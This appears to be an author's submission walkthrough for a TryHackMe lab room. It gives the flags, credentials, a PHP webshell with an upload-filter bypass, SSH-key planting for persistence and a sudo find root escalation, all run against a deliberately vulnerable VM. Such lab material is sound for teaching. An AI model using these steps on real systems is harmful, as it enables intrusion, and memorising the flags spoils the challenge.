# Progress (SnapShare) — official write-up (for THM submission)

> Submit this with the room. **Do NOT publish it publicly before the room is
> approved** — public write-ups delay/violate THM review.

## Submission credentials (for QA reviewers)
- **High-level user:** `michael : Photos#Backup2023`. Reach a `michael` context
  through the web foothold, then `su michael` with this password (it is the
  reused DB password and the account's real login password).
- **SSH note:** sshd is **public-key only** (no password login), so there is no
  SSH shortcut past the intended chain — this is by design. HTTP and SSH stay
  up even outside the graded path, per THM rules.
- Root is reachable from `michael` via `sudo /usr/bin/find . -exec /bin/sh \; -quit`.

## Flags
- `user.txt` → `THM{upl0ad_f1lt3r_bypass3d}`  (`/home/michael/user.txt`)
- `root.txt` → `THM{g7f0b1ns_f1nd_t0_r00t}`  (`/root/root.txt`)

## Intended path (as walked end-to-end)

### Recon
```bash
nmap -sV -sC MACHINE_IP          # 22/tcp ssh, 80/tcp http
curl -I http://MACHINE_IP        # X-Powered-By: PHP/8.1.x  → php2shell-affected branch
```
PHP 8.1 is EOL and listed as affected by php2shell (CVE-2026-109618 /
CVE-2026-109619). This room's graded path does not rely on the memory-corruption
exploit; the version is a fingerprinting objective.

### Foothold — info disclosure + upload-filter bypass (via Burp)
```bash
curl http://MACHINE_IP/robots.txt            # Disallow: /admin
curl http://MACHINE_IP/admin/config.php.bak  # leaks admin : Sup3rS3cr3t!2023
```
Log in at `/admin/` (`admin : Sup3rS3cr3t!2023`). The uploader trusts the
client-supplied MIME type and blacklists `php/html/js` but **not `.phtml`**,
which Apache still executes as PHP.

Make a webshell, then upload it through **Burp Suite** so you can forge the
content type the filter checks:

```bash
echo '<?php system($_GET["c"]); ?>' > shell.phtml
```
1. Proxy the browser through Burp and submit `shell.phtml` from the admin uploader.
2. **Intercept** the multipart POST and change the file part's
   `Content-Type: application/octet-stream` → `Content-Type: image/png`
   (keep the filename `shell.phtml`). Forward the request.
3. The server accepts it as an "image" and drops it in `/uploads/`:
```bash
curl -s "http://MACHINE_IP/uploads/shell.phtml?c=id"   # uid=33(www-data)
```

### User — credential reuse + stable shell via your own SSH key
```bash
curl -s "http://MACHINE_IP/uploads/shell.phtml?c=cat+/var/www/html/config/db.php"
# $DB_USER='michael'; $DB_PASS='Photos#Backup2023'
```
The DB password is reused for the `michael` system account. From the webshell you
only get a cramped, non-interactive context, so upgrade to a clean shell by
planting your own key in michael's `authorized_keys` (michael's home is writable
once you're michael, and SSH is listening):

```bash
# On Kali: generate a keypair once
ssh-keygen -t ed25519 -f ~/.ssh/uploadry -N ''

# Through the webshell, become michael and install YOUR public key:
#   su michael        (password: Photos#Backup2023)
install -d -m 700 -o michael -g michael /home/michael/.ssh
echo 'ssh-ed25519 AAAA...your uploadry.pub...' >> /home/michael/.ssh/authorized_keys
chmod 600 /home/michael/.ssh/authorized_keys

# Now log in cleanly from Kali:
ssh -i ~/.ssh/uploadry michael@MACHINE_IP
cat /home/michael/user.txt
```

### Root — sudo + GTFOBins
```bash
sudo -l                           # (root) NOPASSWD: /usr/bin/find
sudo /usr/bin/find . -exec /bin/sh \; -quit
id                                # uid=0(root)
cat /root/root.txt
```
`find .` (current dir, not `/`) keeps it instant; `-exec /bin/sh \;` spawns a
shell as root because `find` runs under the NOPASSWD sudo rule; `-quit` stops
after the first match so it fires exactly once.

## Notes for reviewers
- No brute-force / long enumeration required (well under the 5-minute rule).
- All state is baked at build time; the VM has no persistence needs and works
  with no internet access.
- Content is original (authored for this room); no VulnHub/SecGen material.
